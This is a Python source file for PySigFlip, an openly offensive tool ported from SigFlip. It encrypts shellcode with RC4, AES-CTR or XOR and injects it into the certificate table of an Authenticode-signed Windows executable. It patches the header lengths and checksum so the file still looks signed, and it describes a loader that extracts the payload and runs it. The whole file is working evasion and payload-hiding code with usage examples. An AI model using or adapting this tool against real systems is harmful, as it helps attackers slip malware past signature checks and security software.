#!/usr/bin/env python3
"""
PySigFlip - Python port of SigFlip (https://github.com/med0x2e/SigFlip)

Injects encrypted shellcode into the PE certificate table (WIN_CERTIFICATE)
of a signed PE file, preserving the Authenticode signature structure so the
binary still appears signed (though the signature hash will no longer match).

Supports RC4, AES-256-CTR, and repeating-key XOR encryption.

Author : Arun (dazzyddos)
Based on : SigFlip by med0x2e
"""

import argparse
import os
import struct
import sys
import secrets
import string

try:
    import pefile
except ImportError:
    sys.exit("[!] Fatal: 'pefile' is required.  Install with:  pip install pefile")

try:
    from Crypto.Cipher import ARC4, AES
    from Crypto.Random import get_random_bytes
    from Crypto.Hash import SHA256
except ImportError:
    sys.exit("[!] Fatal: 'pycryptodome' is required.  Install with:  pip install pycryptodome")


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
SIGFLIP_TAG        = b'\xFE\xED\xFA\xCE\xFE\xED\xFA\xCE'  # 8-byte marker
SIGFLIP_TAG_SIZE   = len(SIGFLIP_TAG)                        # 8
AES_NONCE_SIZE     = 16   # bytes
AES_KEY_SIZE       = 32   # bytes  (AES-256)
XOR_RANDOM_KEY_LEN = 16   # bytes
RC4_RANDOM_KEY_LEN = 15   # characters
WIN_CERT_ALIGN     = 8    # WIN_CERTIFICATE entries must be 8-byte aligned


# ---------------------------------------------------------------------------
# Crypto helpers
# ---------------------------------------------------------------------------

def generate_random_rc4_key(length: int = RC4_RANDOM_KEY_LEN) -> str:
    """Return a cryptographically random alphanumeric string."""
    alphabet = string.ascii_letters + string.digits
    return ''.join(secrets.choice(alphabet) for _ in range(length))


def rc4_crypt(data: bytes, key_str: str) -> bytes:
    """Encrypt / decrypt *data* with RC4 using *key_str* (UTF-8 encoded)."""
    return ARC4.new(key_str.encode('utf-8')).encrypt(data)


def aes_ctr_crypt(data: bytes, key: bytes, nonce: bytes) -> bytes:
    """Encrypt / decrypt *data* with AES-256-CTR."""
    return AES.new(key, AES.MODE_CTR, nonce=nonce).encrypt(data)


def xor_crypt(data: bytes, key: bytes) -> bytes:
    """Encrypt / decrypt *data* with repeating-key XOR."""
    if not key:
        return data
    key_len = len(key)
    return bytes(b ^ key[i % key_len] for i, b in enumerate(data))


def derive_aes_key(passphrase: str) -> bytes:
    """Derive a 32-byte AES-256 key from *passphrase* via SHA-256."""
    return SHA256.new(passphrase.encode('utf-8')).digest()


# ---------------------------------------------------------------------------
# Core injection logic
# ---------------------------------------------------------------------------

def inject_shellcode_to_cert(
    pe_file_path: str,
    shellcode_path: str,
    output_path: str,
    encryption_algo: str,
    key_str: str | None = None,
) -> bool:
    """
    Inject encrypted shellcode into the PE certificate table.

    Returns True on success, False on any error.
    """

    # ---- Validate inputs ---------------------------------------------------
    for label, path in [("PE file", pe_file_path), ("Shellcode", shellcode_path)]:
        if not os.path.isfile(path):
            print(f"[!] Error: {label} '{path}' not found.")
            return False

    # ---- Load PE -----------------------------------------------------------
    try:
        print(f"[*] Loading PE file: {pe_file_path}")
        with open(pe_file_path, 'rb') as fh:
            pe_data = bytearray(fh.read())
        original_file_size = len(pe_data)
        pe = pefile.PE(data=bytes(pe_data), fast_load=False)
    except pefile.PEFormatError as exc:
        print(f"[!] PEFormatError: {exc} — is '{pe_file_path}' a valid PE?")
        return False
    except Exception as exc:
        print(f"[!] Error loading PE file: {exc}")
        return False

    # ---- Locate certificate table ------------------------------------------
    sec_dir_idx = pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']
    if sec_dir_idx >= len(pe.OPTIONAL_HEADER.DATA_DIRECTORY):
        print("[!] Error: PE has no security data-directory slot.")
        return False

    sec_dir = pe.OPTIONAL_HEADER.DATA_DIRECTORY[sec_dir_idx]
    if sec_dir.VirtualAddress == 0 or sec_dir.Size == 0:
        print("[!] Error: PE does not contain a certificate table (unsigned).")
        print("[!] This tool expects an already-signed PE file.")
        return False

    cert_table_offset = sec_dir.VirtualAddress  # file offset (not RVA) for certs

    if cert_table_offset + 4 > original_file_size:
        print(f"[!] Error: Certificate table offset ({cert_table_offset}) is beyond EOF.")
        return False

    try:
        original_dwLength = struct.unpack_from('<L', pe_data, cert_table_offset)[0]
    except struct.error as exc:
        print(f"[!] Error reading WIN_CERTIFICATE.dwLength: {exc}")
        return False

    print(f"[*] WIN_CERTIFICATE.dwLength = {original_dwLength}  (offset 0x{cert_table_offset:X})")

    cert_end = cert_table_offset + original_dwLength
    if cert_end > original_file_size:
        print(f"[!] Error: Certificate entry overflows the file  "
              f"(ends at {cert_end}, file is {original_file_size}).")
        return False

    # Warn if cert table is not at the very end of the file
    if cert_end != original_file_size:
        print(f"[!] Warning: Certificate table does not end at EOF "
              f"(cert ends at {cert_end}, file size {original_file_size}).")
        print("[!]          Data after the cert table may be corrupted.")

    # ---- Read shellcode ----------------------------------------------------
    print(f"[*] Reading shellcode: {shellcode_path}")
    with open(shellcode_path, 'rb') as fh:
        shellcode = fh.read()
    print(f"[*] Shellcode size: {len(shellcode)} bytes")

    # ---- Encrypt shellcode -------------------------------------------------
    ciphertext = b''
    key_display = ''
    nonce_display = ''
    data_prefix = SIGFLIP_TAG          # always starts with the marker

    algo = encryption_algo.lower()
    print(f"[*] Encryption algorithm: {algo.upper()}")

    if algo == 'rc4':
        rc4_key = key_str if key_str else generate_random_rc4_key()
        if not key_str:
            print(f"[*] Generated random RC4 key: '{rc4_key}'")
        else:
            print(f"[*] Using provided RC4 key.")
        key_display = rc4_key
        ciphertext = rc4_crypt(shellcode, rc4_key)

    elif algo == 'aes':
        if key_str:
            print(f"[*] Deriving AES-256 key from passphrase via SHA-256.")
            aes_key = derive_aes_key(key_str)
            key_display = f"{key_str}  (SHA-256 → {aes_key.hex()})"
        else:
            aes_key = get_random_bytes(AES_KEY_SIZE)
            print(f"[*] Generated random {AES_KEY_SIZE * 8}-bit AES key.")
            key_display = aes_key.hex()

        nonce = get_random_bytes(AES_NONCE_SIZE)
        nonce_display = nonce.hex()
        print(f"[*] Generated AES-CTR nonce: {nonce_display}")

        ciphertext = aes_ctr_crypt(shellcode, aes_key, nonce)
        data_prefix = SIGFLIP_TAG + nonce   # nonce stored right after marker

    elif algo == 'xor':
        if key_str:
            xor_key = key_str.encode('utf-8')
            if not xor_key:
                print("[!] Error: XOR key string is empty — shellcode would not be encrypted.")
                return False
            key_display = f"'{key_str}'  (hex: {xor_key.hex()})"
            print(f"[*] Using provided XOR key.")
        else:
            xor_key = get_random_bytes(XOR_RANDOM_KEY_LEN)
            print(f"[*] Generated random {XOR_RANDOM_KEY_LEN}-byte XOR key.")
            key_display = xor_key.hex()

        ciphertext = xor_crypt(shellcode, xor_key)

    else:
        print(f"[!] Error: Unknown algorithm '{encryption_algo}'.")
        return False

    # ---- Build injection block with 8-byte alignment ----------------------
    payload = data_prefix + ciphertext

    new_dwLength_unpadded = original_dwLength + len(payload)
    padding_needed = (WIN_CERT_ALIGN - (new_dwLength_unpadded % WIN_CERT_ALIGN)) % WIN_CERT_ALIGN
    padding = b'\x00' * padding_needed

    injection_block = payload + padding
    new_dwLength = original_dwLength + len(injection_block)

    print(f"[*] Payload size (marker + [nonce] + ciphertext): {len(payload)} bytes")
    print(f"[*] Alignment padding: {padding_needed} bytes")
    print(f"[*] Total injection block: {len(injection_block)} bytes")
    print(f"[*] New WIN_CERTIFICATE.dwLength: {new_dwLength}")

    # ---- Patch PE bytes ----------------------------------------------------
    injection_offset = cert_table_offset + original_dwLength

    # Build new file content
    new_pe_data = bytearray()
    new_pe_data.extend(pe_data[:injection_offset])
    new_pe_data.extend(injection_block)
    new_pe_data.extend(pe_data[injection_offset:])

    # Patch dwLength in WIN_CERTIFICATE header
    struct.pack_into('<L', new_pe_data, cert_table_offset, new_dwLength)

    # Patch Security Directory Size in Optional Header (directly in bytes)
    sec_dir_entry = pe.OPTIONAL_HEADER.DATA_DIRECTORY[sec_dir_idx]
    sec_dir_size_file_offset = (
        sec_dir_entry.__file_offset__
        + sec_dir_entry.__field_offsets__['Size']
    )
    struct.pack_into('<L', new_pe_data, sec_dir_size_file_offset, new_dwLength)
    print(f"[*] Patched Security Directory Size at file offset 0x{sec_dir_size_file_offset:X}")

    # Recalculate PE checksum
    print("[*] Recalculating PE checksum...")
    try:
        tmp_pe = pefile.PE(data=bytes(new_pe_data), fast_load=False)
        new_checksum = tmp_pe.generate_checksum()
        checksum_offset = (
            tmp_pe.OPTIONAL_HEADER.__file_offset__
            + tmp_pe.OPTIONAL_HEADER.__field_offsets__['CheckSum']
        )
        struct.pack_into('<L', new_pe_data, checksum_offset, new_checksum)
        print(f"[*] New PE checksum: 0x{new_checksum:08X}")
    except Exception as exc:
        print(f"[!] Warning: Could not recalculate checksum: {exc}")
        # Zero it out as a fallback
        try:
            checksum_offset = (
                pe.OPTIONAL_HEADER.__file_offset__
                + pe.OPTIONAL_HEADER.__field_offsets__['CheckSum']
            )
            struct.pack_into('<L', new_pe_data, checksum_offset, 0)
            print("[*] Checksum zeroed as fallback.")
        except Exception:
            pass

    # ---- Write output ------------------------------------------------------
    print(f"[*] Writing output: {output_path}")
    try:
        with open(output_path, 'wb') as fh:
            fh.write(new_pe_data)
    except Exception as exc:
        print(f"[!] Error writing output file: {exc}")
        return False

    # ---- Summary -----------------------------------------------------------
    print()
    print("=" * 65)
    print("  INJECTION SUMMARY")
    print("=" * 65)
    print(f"  Output file        : {output_path}")
    print(f"  Output size        : {len(new_pe_data)} bytes")
    print(f"  Algorithm          : {algo.upper()}")
    print(f"  Key                : {key_display}")
    if nonce_display:
        print(f"  AES Nonce (hex)    : {nonce_display}")
    print(f"  Shellcode size     : {len(shellcode)} bytes")
    print(f"  Injected block     : {len(injection_block)} bytes")
    print(f"  Marker tag (hex)   : {SIGFLIP_TAG.hex()}")
    print("=" * 65)
    print()
    print("[+] Done. Use the marker tag to locate the payload in the loader.")
    print(f"[+] Loader needs: tag ({SIGFLIP_TAG_SIZE}B)"
          + (f" + nonce ({AES_NONCE_SIZE}B)" if algo == 'aes' else "")
          + f" + ciphertext ({len(ciphertext)}B)")

    return True


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

BANNER = r"""
  ╔═══════════════════════════════════════════════════════════╗
  ║                    PySigFlip v1.0                        ║
  ║     PE Certificate Table Shellcode Injector              ║
  ║     Based on SigFlip by med0x2e                          ║
  ╚═══════════════════════════════════════════════════════════╝
"""

EPILOG = """\
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 DESCRIPTION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  PySigFlip injects encrypted shellcode into the Authenticode
  certificate table (WIN_CERTIFICATE) of a signed PE file.

  The PE retains its signature structure, so tools that only
  check whether a signature *exists* (rather than validating
  the hash) will still report it as signed. The actual hash
  will no longer match, so strict verification will fail.

  A companion loader (BOF, DLL, EXE) reads the modified PE
  at runtime, locates the 8-byte marker tag, extracts and
  decrypts the shellcode, then executes it.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ENCRYPTION ALGORITHMS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  RC4   Key string is UTF-8 encoded and used directly.
        If no key is supplied, a random 15-character
        alphanumeric key is generated (CSPRNG).

  AES   AES-256 in CTR mode.
        - With -k: passphrase is hashed with SHA-256 to
          derive the 32-byte key.
        - Without -k: a random 32-byte key is generated.
        A random 16-byte nonce is always generated and
        stored in the payload between the tag and ciphertext.

  XOR   Repeating-key XOR.
        - With -k: the key string's UTF-8 bytes are used.
        - Without -k: a random 16-byte key is generated.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 PAYLOAD LAYOUT (inside the certificate entry)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  RC4 : [8B TAG] [RC4 ciphertext]          [0-7B pad]
  AES : [8B TAG] [16B NONCE] [AES-CTR ct]  [0-7B pad]
  XOR : [8B TAG] [XOR ciphertext]          [0-7B pad]

  Padding uses null bytes to maintain 8-byte alignment
  as required by the WIN_CERTIFICATE specification.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 EXAMPLES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  # RC4 with a chosen key
  python pysigflip.py signed.exe payload.bin out.exe --algo rc4 -k mysecretkey

  # RC4 with auto-generated key
  python pysigflip.py signed.exe payload.bin out.exe --algo rc4

  # AES-256-CTR with passphrase
  python pysigflip.py signed.exe payload.bin out.exe --algo aes -k "my passphrase"

  # AES-256-CTR with random key
  python pysigflip.py signed.exe payload.bin out.exe --algo aes

  # XOR with a chosen key
  python pysigflip.py signed.exe payload.bin out.exe --algo xor -k xorkey123

  # XOR with random key
  python pysigflip.py signed.exe payload.bin out.exe --algo xor

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 NOTES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  • The input PE must already be Authenticode-signed.
  • The PE checksum is recalculated automatically.
  • Record the printed key/nonce — your loader needs them.
  • The marker tag is: FEEDFACE FEEDFACE (hex).
"""


def main() -> int:
    print(BANNER)

    parser = argparse.ArgumentParser(
        prog="pysigflip",
        description="Inject encrypted shellcode into a signed PE's certificate table.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=EPILOG,
    )

    parser.add_argument(
        "pe_file",
        metavar="PE_FILE",
        help="Path to the input signed PE file (.exe / .dll).",
    )
    parser.add_argument(
        "shellcode_file",
        metavar="SHELLCODE_FILE",
        help="Path to the raw shellcode file to inject.",
    )
    parser.add_argument(
        "output_file",
        metavar="OUTPUT_FILE",
        help="Path for the output (modified) PE file.",
    )
    parser.add_argument(
        "--algo",
        choices=["rc4", "aes", "xor"],
        default="rc4",
        metavar="ALGO",
        help="Encryption algorithm: rc4 (default), aes, or xor.",
    )
    parser.add_argument(
        "-k", "--key",
        metavar="KEY",
        default=None,
        help=(
            "Encryption key string.  Interpretation depends on --algo:\n"
            "  rc4 → used as-is (UTF-8).\n"
            "  aes → hashed with SHA-256 to derive 32-byte key.\n"
            "  xor → UTF-8 bytes used as repeating key."
        ),
    )

    args = parser.parse_args()

    ok = inject_shellcode_to_cert(
        pe_file_path=args.pe_file,
        shellcode_path=args.shellcode_file,
        output_path=args.output_file,
        encryption_algo=args.algo,
        key_str=args.key,
    )

    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
